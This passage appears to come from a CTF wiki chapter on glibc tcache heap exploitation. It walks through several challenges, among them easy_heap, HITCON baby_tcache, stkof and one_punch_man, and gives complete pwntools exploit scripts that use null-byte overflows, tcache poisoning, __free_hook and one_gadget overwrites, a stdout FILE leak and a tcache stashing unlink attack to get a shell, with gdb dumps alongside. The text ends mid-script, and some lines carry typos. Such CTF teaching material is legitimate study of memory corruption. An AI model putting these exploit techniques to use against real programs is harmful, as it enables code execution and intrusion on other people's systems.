```python
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
```

Then free chunk A (to provide valid fd and bk values for unlinking)

```python
    # delete first to provide valid fd & bk
    delete(7)

```

The current heap structure is as follows:

```
+-----+
|     | <-- tcache perthread struct
+-----+
| ... | <-- 6 tcache chunks (free)
+-----+
|  A  | <-- free
+-----+
|  B  | <-- free, tcache chunk
+-----+
|  C  |
+-----+
|     | <-- tcache chunk, prevents top consolidation
+-----+
| top |
|  .. |
```

In the tcache bin linked list, chunk B is first, so now we can allocate chunk B and perform the NULL byte overflow.

```python
    new(0xf8, '0 - overflow')
```

In the subsequent steps, we need A to be in the unsorted bin freed state, B to be in the allocated state, C to be in the allocated state, and finally we need to be able to free when all 7 tcache slots are full (to trigger consolidation), so we need all 7 tcache slots to be freed.

At this point, since chunk B has been allocated as a tcache chunk, we need to free the tcache chunk that was preventing top chunk consolidation.

```python
    # fill up tcache
    delete(6)
```

After that, we can free chunk C to trigger consolidation.

```python
    # trigger
    delete(9)

```

Structure after consolidation:

```
+-----+
|     | <-- tcache perthread struct
+-----+
| ... | <-- 6 tcache chunks (free)
+-----+                     --------+
|  A  | <-- free large chunk        |
+-----+                             |
|  B  | <-- allocated       --------+--> one large free chunk
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache chunk, prevents top consolidation (free)
+-----+
| top |
|  .. |
```


###### Address Leaking

At this point the heap already has overlapping chunks. Next, we allocate a chunk of size A from the unsorted bin, which causes the libc address to fall into B:

```python
    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0
```

Heap structure:

```
+-----+
|     | <-- tcache perthread struct
+-----+
| ... | <-- 6 tcache chunks (free)
+-----+
|  A  | <-- allocated
+-----+
|  B  | <-- allocated       --------+> one large free chunk
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache chunk, prevents top consolidation (free)
+-----+
| top |
|  .. |
```

###### tcache UAF attack

Next, since chunk B is already in a freed state but still has a pointer pointing to it, we just need to allocate again so that two pointers point to chunk B. Then, when there is enough tcache space, we use tcache to perform a double free, and subsequently attack the free hook via UAF.


```python
    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

```

##### Complete Exploit

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = process('./easy_heap')

def cmd(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    cmd(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    cmd(3)
    p.recvuntil('> ')
    p.sendline(str(idx))
    return p.recvline()[:-1]


def main():
    # Your exploit script goes here

    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)

    # step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
    # delete first to provide valid fd & bk
    delete(7)

    new(0xf8, '0 - overflow')
    # fill up tcache
    delete(6)

    # trigger
    delete(9)

    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0

    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

if __name__ == '__main__':
    main()
```


#### Challenge 2 : HITCON 2018 PWN baby_tcache

##### Basic Information

The libc in the remote environment is libc-2.27.so, same as the challenge above.

```bash
zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
[*] '/home/zj/c_study/hitcon2018/pwn1/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

##### Basic Functionality

The program has very simple functionality — just 2 features. One feature is New, which allocates chunks with memory no larger than 0x2000. A total of 10 chunks can be allocated, managed through a global array `arr` on the bss segment, while an array `size_arr` on the bss segment stores the allocation size of each corresponding chunk.

The program's other feature is delete, which deletes the selected heap chunk. Before deletion, the content area of the chunk is overwritten with 0xdadadada according to the allocated size.

The vulnerability in the program is in the New function — after writing data, there is a null-byte overflow vulnerability, specifically as follows:

```c
int new()
{
  _QWORD *v0; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  _BYTE *malloc_p; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      LODWORD(v0) = puts(":(");
      return (signed int)v0;
    }
    if ( !bss_arr[i] )
      break;
  }
  printf("Size:");
  size = str2llnum();
  if ( size > 0x2000 )
    exit(-2);
  malloc_p = malloc(size);
  if ( !malloc_p )
    exit(-1);
  printf("Data:");
  read_input((__int64)malloc_p, size);
  malloc_p[size] = 0;                           // null byte bof
  bss_arr[i] = malloc_p;
  v0 = size_arr;
  size_arr[i] = size;
  return (signed int)v0;
}
```

##### Exploitation Approach

The vulnerability in the program is easy to find, and since the allocated chunk size is controllable, the general approach is to construct overlapping chunks. However, the problem is that even if the main_arena related address is written onto the chunk, there is no show function available for information leakage, because the program simply does not provide this functionality.

There are two approaches:

1. Consider using partial overwrite to change the last few bytes of the main_arena related address, use the tcache mechanism to write a `__free_hook` chunk into the tcache linked list, then use unsortedbin attack to write the unsortedbin address into `__free_hook`, allocate `__free_hook` out, and use partial overwrite again to write a one_gadget into `__free_hook`. However, this method requires too much brute-forcing — up to 4096 attempts.

2. Leak through IO file. The challenge uses the `puts` function, which ultimately calls `_IO_new_file_overflow`. This function ultimately uses `_IO_do_write` to perform the actual output. During output, if a buffer exists, it outputs the buffer content starting from `_IO_write_base` up to `_IO_write_ptr` (i.e., the values from `_IO_write_base` to `_IO_write_ptr` are treated as the buffer; when there is no buffer, both pointers point to the same location near the structure, which is within libc). However, after `setbuf`, it theoretically should not use a buffer. Nevertheless, if we can modify the flags portion of the `_IO_2_1_stdout_` structure to make it believe stdout has a buffer, and then perform a partial overwrite of the value at `_IO_write_base`, we can leak the libc address.

Relevant code involved in approach 2:

The `puts` function will ultimately call this function. We need to satisfy certain flag requirements to make it enter `_IO_do_write`:

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) 
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) 
    {
      :
      :
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  // 需要调用的目标，如果使得 _IO_write_base < _IO_write_ptr，且 _IO_write_base 处
                                                // 存在有价值的地址 （libc 地址）则可进行泄露
                                                // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写
			 f->_IO_write_ptr - f->_IO_write_base);

```

The section after entering:

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)  /* 需要满足 */
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
     ............
    }
  count = _IO_SYSWRITE (fp, data, to_do); // 这里真正进行 write

```

As we can see, to call the target function, certain flags requirements need to be satisfied. The specific flags that need to be satisfied are:

```c
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

##### Exploitation Process

- Form overlapping chunk

```python
    alloc(0x500-0x8)  # 0
    alloc(0x30)   # 1
    alloc(0x40)  # 2
    alloc(0x50)  # 3
    alloc(0x60)  # 4
    alloc(0x500-0x8)  # 5
    alloc(0x70)  # 6  gap to top
    
    delete(4)
    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5)  # backward coeleacsing
```

```
gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
0x555d56ed6250:	0x0000000000000000	0x0000000000000b61  ( free(#5) ==> merge into #0 get 0x660+0x500=0xb60 chunk ) #0
0x555d56ed6260:	0x00007fa8a0a3fca0	0x00007fa8a0a3fca0
0x555d56ed6270:	0x0000000000000000	0x0000000000000000
0x555d56ed6280:	0xdadadadadadadada	0xdadadadadadadada
...............
0x555d56ed6740:	0xdadadadadadadada	0xdadadadadadadada
0x555d56ed6750:	0x0000000000000500	0x0000000000000040   #1
0x555d56ed6760:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6770:	0x0000000000000000	0x0000000000000000
0x555d56ed6780:	0x0000000000000000	0x0000000000000000
0x555d56ed6790:	0x0000000000000000	0x0000000000000051   #2
0x555d56ed67a0:	0x0000000000000000	0xdadadadadadadada
...............
0x555d56ed67e0:	0x0000000000000000	0x0000000000000061   #3
0x555d56ed67f0:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6800:	0x0000000000000000	0x0000000000000000
...............
0x555d56ed6830:	0x0000000000000000	0x0000000000000000
0x555d56ed6840:	0x0000000000000000	0x0000000000000071   #4
0x555d56ed6850:	0x4141414141414141	0x4141414141414141
...............
0x555d56ed68b0:	0x0000000000000660	0x0000000000000500   #5
...............
```

- Overwrite relevant fields of the file structure

```python
    alloc(0x500-0x9+0x34)
    delete(4)
    alloc(0xa8,'\x60\x07')  # corrupt the fd
    
    alloc(0x40,'a')
   
    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure !!!
```

```
gdb-peda$ x/20xg stdout
0x7fa8a0a40760 <_IO_2_1_stdout_>:	0x00000000fbad1800(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40770 <_IO_2_1_stdout_+16>:	0x0000000000000000(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40780 <_IO_2_1_stdout_+32>:	0x00007fa8a0a40700(!!!_IO_write_base)	0x00007fa8a0a407e3
0x7fa8a0a40790 <_IO_2_1_stdout_+48>:	0x00007fa8a0a407e3	0x00007fa8a0a407e3
0x7fa8a0a407a0 <_IO_2_1_stdout_+64>:	0x00007fa8a0a407e4	0x0000000000000000
0x7fa8a0a407b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7fa8a0a407c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007fa8a0a3fa00
0x7fa8a0a407d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7fa8a0a407e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007fa8a0a418c0
0x7fa8a0a407f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
gdb-peda$ x/20xg 0x00007fa8a0a40700
0x7fa8a0a40700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007fa8a0a418b0 (leak target)
0x7fa8a0a40710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fa8a0a40720 <_IO_2_1_stderr_+160>:	0x00007fa8a0a3f780	0x0000000000000000
```

- Reason for modifying the file structure
  - By modifying stdout->_flags to make the program flow reach the function _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
  
- Complete exp

```python
from pwn import *
r = process('./baby_tcache'), env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Your choice: ",str(opt))

def alloc(size,data='a'):
    menu(1)
    r.sendlineafter("Size:",str(size))
    r.sendafter("Data:",data)

def delete(idx):
    menu(2)
    r.sendlineafter("Index:",str(idx))

def exp():
    alloc(0x500-0x8)  # 0
    alloc(0x30) # 1
    alloc(0x40) # 2
    alloc(0x50) # 3
    alloc(0x60) # 4
    alloc(0x500 - 0x8) # 5
    alloc(0x70) # 6  gap to avoid top consolidation
    
    delete(4)
    alloc(0x68, 'A'*0x60 + '\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5) # backward coeleacsing
    alloc(0x500 - 0x9 + 0x34)
    delete(4)
    alloc(0xa8, '\x60\x07') # corrupt the fd
    
    alloc(0x40, 'a')
   
    alloc(0x3e, p64(0xfbad1800) + p64(0) * 3 + '\x00') # overwrite the file-structure
    
    print(repr(r.recv(8)))
    print("leak!!!!!!!!!")
    info1 = r.recv(8)
    print(repr(info1))
    libc.address = u64(info1) - 0x3ed8b0
    log.info("libc @ " + hex(libc.address))
    alloc(0xa8, p64(libc.symbols['__free_hook']))
    alloc(0x60, "A")
    alloc(0x60, p64(libc.address + 0x4f322)) # one gadget with $rsp+0x40 = NULL
    delete(0)
    r.interactive()

if __name__=='__main__':
    exp()
```

##### Challenge 2 Summary

The exploitation process of this program is a useful technique. For information on using file structures to achieve memory read/write, you can refer to Angelboy's blog from Taiwan. In hctf2018 steak, there was also an information leakage issue — most people adopted the approach of copying puts_addr into the `__free_hook` pointer to achieve information leakage, but it is also possible to achieve information leakage by modifying fields of the file structure.

#### Challenge 3 : 2014 HITCON stkof

##### Basic Information

See [unlink HITCON stkof introduction](./unlink.md#2014 HITCON stkof)

##### libc 2.26 tcache exploitation method

This challenge allows overflowing a relatively long number of bytes, so the fd pointer of a chunk can be overwritten. In the tcache mechanism after libc 2.26, there is no size check on the chunk pointed to by the fd pointer, so the fd pointer can be overwritten with any address. After freeing the overflowed chunk and performing two mallocs, arbitrary address modification can be achieved:


```python
from pwn import *
from GdbWrapper import GdbWrapper
from one_gadget import generate_one_gadget
context.log_level = "info"
context.endian = "little"
context.word_size = 64
context.os = "linux"
context.arch = "amd64"
context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
def Alloc(io, size):
    io.sendline("1")
    io.sendline(str(size))
    io.readline()
    io.readline()
def Edit(io, index, length, buf):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(length))
    io.send(buf)
    io.readline()
def Free(io, index):
    io.sendline("3")
    io.sendline(str(index))
    try:
        tmp = io.readline(timeout = 3)
    except Exception:
        io.interactive()
    print tmp
    if "OK" not in tmp and "FAIL" not in tmp:
        return tmp
def main(binary, poc):
    # test env
    bss_ptrlist = None
    free_index = None
    free_try = 2
    elf = ELF(binary)
    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
    while bss_ptrlist == None:
        # find bss ptr
        io = process(binary)
        gdbwrapper = GdbWrapper(io.pid)
        # gdb.attach(io)
        Alloc(io, 0x400)
        Edit(io, 1, 0x400, "a" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 2, 0x400, "b" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 3, 0x400, "c" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 4, 0x400, "d" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 5, 0x400, "e" * 0x400)
        heap = gdbwrapper.heap()
        heap = [(k, heap[k]) for k in sorted(heap.keys())]
        ptr_addr = []
        index = 1
        while True:
            for chunk in heap:
                address = chunk[0]
                info = chunk[1]
                ptr_addr_length = len(ptr_addr)
                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
                        if int(address, 16) + 0x10 == x["ADDR"]:
                            tmp = gdbwrapper.search("qword", x["ADDR"])
                            for y in tmp:
                                if binary.split("/")[-1] in y["PATH"]:
                                    ptr_addr.append(y["ADDR"])
                                    break
                        if (len(ptr_addr) != ptr_addr_length):
                            break
                if len(ptr_addr) != ptr_addr_length:
                    break
            index += 1
            if (index == 5):
                break
        bss_ptrlist = sorted(ptr_addr)[0]
        io.close()
    while free_index == None:
        io = process(binary)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_try)
        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
        try:
            Alloc(io, 0x400)
            Alloc(io, 0x400)
        except Exception:
            free_index = free_try
        free_try += 1
        io.close()
    # arbitrary write
    libc = ELF(binary).libc
    one_gadget_offsets = generate_one_gadget(libc.path)
    for one_gadget_offset in one_gadget_offsets:
        io = process(binary)
        libc = elf.libc
        gdbwrapper = GdbWrapper(io.pid)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_index)
        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        ###leak libc
        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
        libc_base = leaked - libc.symbols["malloc"]
        system_addr = libc_base + libc.symbols["system"]
        one_gadget_addr = libc_base + one_gadget_offset
        Edit(io, 1, 0x08, p64(one_gadget_addr))
        Free(io, 1)
        try:
            io.sendline("id")
            log.info(io.readline(timeout=3))
        except Exception, e:
            io.close()
            continue
        io.interactive()
if __name__ == "__main__":
    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
    main(binary, "")
```

#### Challenge 4 : HITCON 2019 one_punch_man

##### Basic Information

Common protections are enabled. The challenge environment is glibc 2.29, with seccomp sandbox protection enabled — only whitelisted system calls can be used.

```bash
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
╰─$ checksec ./one_punch
[*] '/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
╰─$ seccomp-tools dump ./one_punch
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL

```

##### Basic Functionality

The Add function can allocate heap chunks of size `[0x80,0x400]`. The allocation function is `calloc`. Input data is first stored on the stack, then copied to an array on `bss` using `strncpy`.

The Delete function does not clear the chunk after `free`, causing `double free` and `UAF`

```c
void __fastcall Delete(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  MyPuts("idx: ");
  v2 = read_int();
  if ( v2 > 2 )
    error("invalid", a2);
  free(*((void **)&unk_4040 + 2 * v2));
}
```
The backdoor function can call `malloc` to allocate a heap chunk of size `0x217`, but it requires `*(_BYTE *)(qword_4030 + 0x20) > 6`. In the `main` function, we can see this is initialized to `heap_base+0x10`. For glibc 2.29, this position stores the count of the `0x220` size `tcache_bin` in `tcache_perthread_struct`. Normally, if we want to call the backdoor functionality, we need this `count` to be 7. However, this also means that `0x217` allocation and deallocation would behave the same as in `glibc 2.23` — we cannot use `UAF` to modify the chunk's `fd` to achieve arbitrary address writes. Therefore, we need to modify this value through other means.
```c
__int64 __fastcall Magic(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(qword_4030 + 0x20) <= 6 )
    error("gg", a2);
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err", a2);
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io", buf);
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```
The Edit and Show functions can respectively edit and display heap chunk content.

##### Exploitation Approach

Since glibc 2.29 added integrity checks for the `unsorted bin` linked list, which completely invalidates `unsorted bin attack`, our goal is to write a `large value` to an address. In this case, we can choose `tcache stashing unlink attack`.

First, we can leak `heap` and `libc` addresses through UAF. The specific method is to allocate and free multiple chunks so they enter `tcache`. Through the `Show` function, we can output the `fd` value of `tcache bin` to leak the heap address. After freeing seven chunks within the `small bin size` range, the eighth free will place the chunk into `unsorted bin`. Through the `Show` function, we can leak the libc address.

We first link `__malloc_hook` into `tcache` through `UAF` for later use. Then we allocate and free chunks of size `0x100` six times into `tcache`. Through `unsorted bin` splitting to obtain the `last remainder`, we get two chunks of size `0x100`. Then we allocate a block larger than 0x100 to make them enter `small bin`. We refer to them as bin1 and bin2 in the order they were freed. We modify `bin2->bk` to `(heap_base+0x2f)-0x10`, and call `calloc(0xf0)` to trigger the logic of placing `small bin` chunks into `tcache`. Since `tcache` already has 6 chunks, the loop only processes once, which also avoids the memory access error caused by `bck->fd=bin` during unlinking when fake_chunk has no writable address at bk for the next chunk. This ultimately changes the value at `heap_base+0x30` to bypass the check.

##### Exploitation Steps

Let's set a breakpoint before calling calloc. We can see that at this point `tcache[0x100]` has 6 heap chunks, and the smallbin allocation order is `0x000055555555c460->0x55555555cc80->0x000055555555901f`. After `calloc(0xf0)` is called, `0x000055555555c460` is returned to the user, `0x55555555cc80` is linked into tcache, and since there is no more space, the loop exits and `0x000055555555901f` is not processed.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x100 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](6): 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x220)   tcache_entry[32](1): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x55555555cc80
0x55555555cc80: 0x0000000000000000      0x0000000000000101
0x55555555cc90: 0x000055555555c460      0x000055555555901f
gdb-peda$ x/4gx 0x000055555555c460
0x55555555c460: 0x0000000000000000      0x0000000000000101
0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
gdb-peda$ x/4gx 0x00007ffff7fb4d90
0x7ffff7fb4d90 <main_arena+336>:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
0x7ffff7fb4da0 <main_arena+352>:        0x000055555555cc80      0x000055555555c460
```
The result after calloc allocation is consistent with our expectation. `0x000055555555901f` as `fake_chunk` has its `fd` also overwritten with a `libc` address
```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x700 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](7): 0x55555555cc90 --> 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x210)   tcache_entry[31](144): 0
(0x220)   tcache_entry[32](77): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x230)   tcache_entry[33](251): 0
(0x240)   tcache_entry[34](247): 0
(0x250)   tcache_entry[35](255): 0
(0x260)   tcache_entry[36](127): 0
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x000055555555901f+0x10
0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
0x55555555903f: 0x0000000000000000      0x0000000000000000
```
Due to sandbox protection, we cannot execute `execve` function calls and can only read the flag through `open/read/write`. We choose to modify `__malloc_hook` to `gadget(mov eax, esi ; add rsp, 0x48 ; ret)` by calling the backdoor function, so that when add is called, `rsp` is moved to a controllable input area to execute `rop chains` for `orw` to read the `flag`.

Complete exp is as follows:

```python
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./one_punch')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./one_punch')

def Add(idx,name):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)


def Edit(idx,name):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)

def Show(idx):
    p.recvuntil('> ')
